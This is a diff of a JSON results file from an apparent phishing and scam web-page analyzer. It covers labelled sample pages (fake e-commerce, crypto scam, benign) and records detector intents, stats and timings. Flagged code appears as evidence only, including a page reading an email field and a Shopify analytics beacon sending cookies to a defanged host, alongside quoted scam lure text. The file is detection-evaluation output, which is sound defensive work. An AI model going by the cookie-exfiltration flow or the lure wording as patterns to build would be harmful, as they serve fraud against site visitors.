+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -5731,7 +6641,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 17.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -5811,24 +6733,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 34.5,
-   "quality": 26.2,
-   "dom_features": 19.3,
-   "dom_model": 21.1,
-   "content": 28.3,
-   "text_models": 348.6,
-   "js_analysis": 10.7,
-   "behavior": 4.4,
-   "behavior_model": 30.5,
+   "preprocess": 32.4,
+   "quality": 22.0,
+   "dom_features": 25.2,
+   "dom_model": 22.0,
+   "content": 29.2,
+   "text_models": 361.6,
+   "js_analysis": 9.4,
+   "behavior": 3.9,
+   "behavior_model": 43.0,
    "fusion": 0.1,
-   "total": 524.7
+   "total": 566.7
   }
  },
  "45": {
-  "analysis_id": "409882b93a5343ba9faad6e76d168f6b",
+  "analysis_id": "122b3f3e87614a29aaafe4da70c19cc2",
   "request_id": "c2_fake_ecommerce_000040",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:04.627817+05:30",
+  "analyzed_at": "2026-10-21T08:26:13.143759+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -5911,7 +6833,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -5951,7 +6876,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 49.0,
+     "page_text_chars": 1933.0,
+     "language_confidence": 0.7504,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -5974,7 +6909,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 33.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -6054,24 +7001,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 13.9,
-   "quality": 13.9,
-   "dom_features": 9.0,
-   "dom_model": 33.9,
-   "content": 17.6,
-   "text_models": 343.4,
-   "js_analysis": 134.8,
-   "behavior": 101.8,
-   "behavior_model": 26.7,
+   "preprocess": 14.4,
+   "quality": 11.3,
+   "dom_features": 10.6,
+   "dom_model": 26.8,
+   "content": 19.3,
+   "text_models": 374.5,
+   "js_analysis": 132.6,
+   "behavior": 106.5,
+   "behavior_model": 24.0,
    "fusion": 0.1,
-   "total": 696.4
+   "total": 727.6
   }
  },
  "44": {
-  "analysis_id": "b7c630ad1ecd41a0914058e9fec5119d",
+  "analysis_id": "4446477031914e9fb848db1fb7695a43",
   "request_id": "c2_fake_ecommerce_000038",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:03.917779+05:30",
+  "analyzed_at": "2026-10-21T08:26:12.401688+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -6154,7 +7101,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -6194,7 +7144,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 51.0,
+     "page_text_chars": 2241.0,
+     "language_confidence": 0.8299,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -6217,7 +7177,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 32.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -6297,24 +7269,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 27.6,
-   "quality": 18.8,
-   "dom_features": 10.4,
-   "dom_model": 26.7,
-   "content": 11.9,
-   "text_models": 354.3,
-   "js_analysis": 119.7,
-   "behavior": 106.6,
-   "behavior_model": 23.0,
+   "preprocess": 17.0,
+   "quality": 12.9,
+   "dom_features": 6.5,
+   "dom_model": 22.8,
+   "content": 12.7,
+   "text_models": 349.6,
+   "js_analysis": 127.8,
+   "behavior": 98.0,
+   "behavior_model": 26.5,
    "fusion": 0.1,
-   "total": 700.5
+   "total": 683.1
   }
  },
  "43": {
-  "analysis_id": "b952a6e9661f4afba57719fee4c9522b",
+  "analysis_id": "376e3989cef64a06859a67228d7cccc5",
   "request_id": "c2_fake_ecommerce_000032",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:03.192588+05:30",
+  "analyzed_at": "2026-10-21T08:26:11.700913+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -6388,7 +7360,20 @@
     "detail": "Page code reads 2 credential field value(s) (#email).",
     "evidence": "cttqvi.querySelector('#email')?.value",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 168,
+      "code": "cttqvi.querySelector('#email')?.value",
+      "note": "credential_input: #email = email field"
+     },
+     {
+      "kind": "source",
+      "line": 199,
+      "code": "document.querySelector('#email')?.value",
+      "note": "credential_input: #email = email field"
+     }
+    ]
    }
   ],
   "findings_total": 5,
@@ -6418,7 +7403,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -6458,7 +7446,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 136.0,
+     "page_text_chars": 2984.0,
+     "language_confidence": 0.8382,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9945
+    }
    },
    "behavior": {
     "status": "ok",
@@ -6483,7 +7481,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_access",
+      "display": "Credential access",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 2,
+      "cues": [],
+      "example": "Page code reads 2 credential field value(s) (#email)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 12.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 23.0,
+     "sinks_total": 12.0,
+     "flows_total": 12.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 3.0
+    }
    }
   },
   "explanation": {
@@ -6563,24 +7583,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 18.9,
-   "quality": 17.3,
-   "dom_features": 8.7,
-   "dom_model": 22.3,
-   "content": 25.7,
-   "text_models": 368.4,
-   "js_analysis": 32.3,
-   "behavior": 61.4,
-   "behavior_model": 32.4,
+   "preprocess": 18.2,
+   "quality": 14.7,
+   "dom_features": 11.8,
+   "dom_model": 24.2,
+   "content": 29.9,
+   "text_models": 374.4,
+   "js_analysis": 29.3,
+   "behavior": 58.5,
+   "behavior_model": 29.3,
    "fusion": 0.1,
-   "total": 588.9
+   "total": 624.1
   }
  },
  "42": {
-  "analysis_id": "7980f5b29dbf49ddb5fb5478413c6691",
+  "analysis_id": "d3e6b490bcfc4dcbbb70c5cfd6d1651f",
   "request_id": "c2_fake_ecommerce_000031",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:02.588989+05:30",
+  "analyzed_at": "2026-10-21T08:26:11.063221+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -6651,7 +7671,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -6691,7 +7714,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 57.0,
+     "page_text_chars": 2261.0,
+     "language_confidence": 0.7631,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -6714,7 +7747,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 30.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -6794,24 +7839,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 13.5,
-   "quality": 13.0,
-   "dom_features": 7.7,
-   "dom_model": 25.9,
-   "content": 14.3,
-   "text_models": 367.5,
-   "js_analysis": 155.2,
-   "behavior": 119.0,
-   "behavior_model": 22.8,
+   "preprocess": 17.4,
+   "quality": 19.6,
+   "dom_features": 9.1,
+   "dom_model": 28.7,
+   "content": 12.7,
+   "text_models": 378.9,
+   "js_analysis": 136.1,
+   "behavior": 122.0,
+   "behavior_model": 23.1,
    "fusion": 0.1,
-   "total": 740.3
+   "total": 756.0
   }
  },
  "41": {
-  "analysis_id": "48d157eb355c4af4afa499b1ce81144e",
+  "analysis_id": "5389a9a0b35b4403811e2b68203eb0b9",
   "request_id": "c2_fake_ecommerce_000022",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:01.834007+05:30",
+  "analyzed_at": "2026-10-21T08:26:10.292057+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -6894,7 +7939,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -6934,7 +7982,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 43.0,
+     "page_text_chars": 1816.0,
+     "language_confidence": 0.6225,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -6957,7 +8015,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 31.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -7037,24 +8107,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 18.8,
-   "quality": 12.2,
-   "dom_features": 7.1,
-   "dom_model": 21.6,
-   "content": 14.9,
-   "text_models": 376.7,
-   "js_analysis": 120.3,
-   "behavior": 110.0,
-   "behavior_model": 22.9,
+   "preprocess": 14.0,
+   "quality": 11.2,
+   "dom_features": 11.5,
+   "dom_model": 35.2,
+   "content": 18.1,
+   "text_models": 365.3,
+   "js_analysis": 124.9,
+   "behavior": 105.1,
+   "behavior_model": 23.3,
    "fusion": 0.1,
-   "total": 705.5
+   "total": 716.1
   }
  },
  "40": {
-  "analysis_id": "52a4fc11ead248949e39e0dc5d85d8ba",
+  "analysis_id": "bb7a574c7be64c50833c76f076e6c877",
   "request_id": "c2_fake_ecommerce_000009",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:01.114754+05:30",
+  "analyzed_at": "2026-10-21T08:26:09.560823+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -7137,7 +8207,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -7177,7 +8250,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 52.0,
+     "page_text_chars": 1958.0,
+     "language_confidence": 0.8599,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -7200,7 +8283,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 34.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -7280,24 +8375,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 12.6,
-   "quality": 11.0,
-   "dom_features": 7.4,
-   "dom_model": 27.0,
-   "content": 12.1,
-   "text_models": 356.5,
-   "js_analysis": 125.2,
-   "behavior": 105.7,
-   "behavior_model": 22.6,
+   "preprocess": 20.6,
+   "quality": 11.2,
+   "dom_features": 6.4,
+   "dom_model": 26.1,
+   "content": 18.5,
+   "text_models": 370.7,
+   "js_analysis": 137.5,
+   "behavior": 99.3,
+   "behavior_model": 22.3,
    "fusion": 0.1,
-   "total": 681.1
+   "total": 720.7
   }
  },
  "39": {
-  "analysis_id": "1b5d4eb5502b406897d11fee701c6987",
+  "analysis_id": "86dd59eb70d345ebb86984dfdccc3ff1",
   "request_id": "c2_fake_ecommerce_000008",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:00.418725+05:30",
+  "analyzed_at": "2026-10-21T08:26:08.823400+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -7380,7 +8475,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -7420,7 +8518,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 45.0,
+     "page_text_chars": 2736.0,
+     "language_confidence": 0.8414,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -7443,7 +8551,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 23.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -7523,24 +8643,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 20.3,
-   "quality": 17.1,
-   "dom_features": 11.5,
-   "dom_model": 33.9,
-   "content": 11.5,
-   "text_models": 368.2,
+   "preprocess": 21.6,
+   "quality": 16.0,
+   "dom_features": 7.1,
+   "dom_model": 34.1,
+   "content": 10.4,
+   "text_models": 386.1,
    "js_analysis": 105.9,
-   "behavior": 90.8,
-   "behavior_model": 22.8,
+   "behavior": 102.3,
+   "behavior_model": 23.7,
    "fusion": 0.1,
-   "total": 683.3
+   "total": 717.9
   }
  },
  "38": {
-  "analysis_id": "0d18af4b462141018dd06e8676a3b884",
+  "analysis_id": "b51105df778f4d9497fd1e32a3cad628",
   "request_id": "c2_crypto_scam_000039",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:59.712289+05:30",
+  "analyzed_at": "2026-10-21T08:26:08.082582+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -7623,7 +8743,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -7663,7 +8786,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 52.0,
+     "page_text_chars": 1312.0,
+     "language_confidence": 0.6675,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -7686,7 +8819,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 15.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 23.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -7766,24 +8911,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 20.9,
-   "quality": 20.8,
-   "dom_features": 12.5,
-   "dom_model": 30.3,
-   "content": 11.3,
-   "text_models": 320.5,
-   "js_analysis": 30.4,
-   "behavior": 25.9,
-   "behavior_model": 29.8,
+   "preprocess": 17.7,
+   "quality": 13.0,
+   "dom_features": 7.8,
+   "dom_model": 32.0,
+   "content": 11.7,
+   "text_models": 321.8,
+   "js_analysis": 34.0,
+   "behavior": 26.3,
+   "behavior_model": 31.7,
    "fusion": 0.1,
-   "total": 503.4
+   "total": 501.7
   }
  },
  "37": {
-  "analysis_id": "3cc02ccff0ad4704907907d6fcffdb93",
+  "analysis_id": "dc55722dd0274c8382477dd99b8bd29b",
   "request_id": "c2_crypto_scam_000037",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:59.186416+05:30",
+  "analyzed_at": "2026-10-21T08:26:07.558170+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -7864,7 +9009,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -7905,7 +9053,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 16.0,
+     "page_text_chars": 833.0,
+     "language_confidence": 0.7786,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -7928,7 +9086,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 3.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 2.0,
+     "sources_total": 2.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -8008,24 +9178,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 10.6,
-   "quality": 6.4,
-   "dom_features": 2.8,
-   "dom_model": 26.7,
-   "content": 7.1,
-   "text_models": 180.6,
-   "js_analysis": 7.1,
-   "behavior": 2.4,
-   "behavior_model": 32.3,
+   "preprocess": 7.0,
+   "quality": 6.0,
+   "dom_features": 4.2,
+   "dom_model": 49.4,
+   "content": 10.2,
+   "text_models": 184.0,
+   "js_analysis": 10.3,
+   "behavior": 3.7,
+   "behavior_model": 31.7,
    "fusion": 0.1,
-   "total": 276.9
+   "total": 312.0
   }
  },
  "36": {
-  "analysis_id": "59a212b447b94dbc90844c545d83a5c9",
+  "analysis_id": "f08ffd4650b64e2c80d6610edb04b4cf",
   "request_id": "c2_crypto_scam_000011",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:58.886725+05:30",
+  "analyzed_at": "2026-10-21T08:26:07.228511+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -8129,7 +9299,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -8170,7 +9343,40 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "investment_lure",
+      "display": "investment lure",
+      "method": "cue_words",
+      "severity": null,
+      "count": 2,
+      "cues": [
+       "investment plan"
+      ],
+      "example": "As your chosen investment plan matures, watch your investments grow and profits accumulate."
+     },
+     {
+      "intent": "fake_security_warning",
+      "display": "fake security warning",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "unauthorized access"
+      ],
+      "example": "Our KYC verification and Google Authenticator features fortify your account against unauthorized access. Trust in our platform to protect your digital holdings…"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 120.0,
+     "page_text_chars": 2996.0,
+     "language_confidence": 0.8447,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -8193,7 +9399,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 7.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 2.0,
+     "sinks_total": 5.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -8273,24 +9491,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 36.8,
-   "quality": 22.4,
-   "dom_features": 11.3,
-   "dom_model": 31.1,
-   "content": 32.1,
-   "text_models": 359.2,
-   "js_analysis": 7.6,
-   "behavior": 12.0,
-   "behavior_model": 34.7,
+   "preprocess": 34.6,
+   "quality": 18.0,
+   "dom_features": 15.9,
+   "dom_model": 29.7,
+   "content": 33.7,
+   "text_models": 380.5,
+   "js_analysis": 10.3,
+   "behavior": 11.9,
+   "behavior_model": 30.0,
    "fusion": 0.1,
-   "total": 548.6
+   "total": 591.3
   }
  },
  "35": {
-  "analysis_id": "3fe3a135e285428e8f9868676aa18dc9",
+  "analysis_id": "5dfe99ea219b40f4939796e44af54229",
   "request_id": "c2_crypto_scam_000010",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:58.315512+05:30",
+  "analyzed_at": "2026-10-21T08:26:06.614082+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -8361,7 +9579,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -8401,7 +9622,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 2.0,
+     "page_text_chars": 88.0,
+     "language_confidence": 0.8588,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -8424,7 +9655,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -8505,23 +9748,23 @@
   },
   "timings_ms": {
    "preprocess": 1.6,
-   "quality": 0.9,
+   "quality": 1.0,
    "dom_features": 0.6,
-   "dom_model": 21.9,
+   "dom_model": 25.2,
    "content": 0.9,
-   "text_models": 37.6,
-   "js_analysis": 0.8,
+   "text_models": 34.0,
+   "js_analysis": 0.6,
    "behavior": 0.3,
-   "behavior_model": 47.3,
+   "behavior_model": 36.3,
    "fusion": 0.1,
-   "total": 112.5
+   "total": 102.0
   }
  },
  "34": {
-  "analysis_id": "b1728666218f42869e4fb06aea5debce",
+  "analysis_id": "fa35ceab9fb64b7ca359492a8129e030",
   "request_id": "c2_benign_000234",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:58.189994+05:30",
+  "analyzed_at": "2026-10-21T08:26:06.498006+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -8565,7 +9808,44 @@
     "detail": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "document.cookie",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "document.cookie",
+      "note": "source: document.cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_cookie_matches = document.cookie.match(/_shopify_s=([^;]*)/)",
+      "note": "assign: session_cookie_matches"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token_from_cookie = session_cookie_matches && session_cookie_matches.length === 2 ? session_cookie_matches[1]...",
+      "note": "assign: session_token_from_cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token = session_token_from_headers || session_token_from_cookie || \"\"",
+      "note": "concat: session_token"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 37372231813,url: window.location.href,navigation_start,duration: currentMs - navigation_start,ses...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "behavior.external_data_transmission.low_sensitivity",
@@ -8575,7 +9855,26 @@
     "detail": "Sends the page address (location.href) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "window.location.href",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.location.href",
+      "note": "source: location.href"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 37372231813,url: window.location.href,navigation_start,duration: currentMs - navigation_start,ses...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "content.urgency",
@@ -8624,7 +9923,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -8664,7 +9966,40 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "fake_reward",
+      "display": "fake reward",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "gift card"
+      ],
+      "example": "Gift Card"
+     },
+     {
+      "intent": "urgency_threat",
+      "display": "urgency threat",
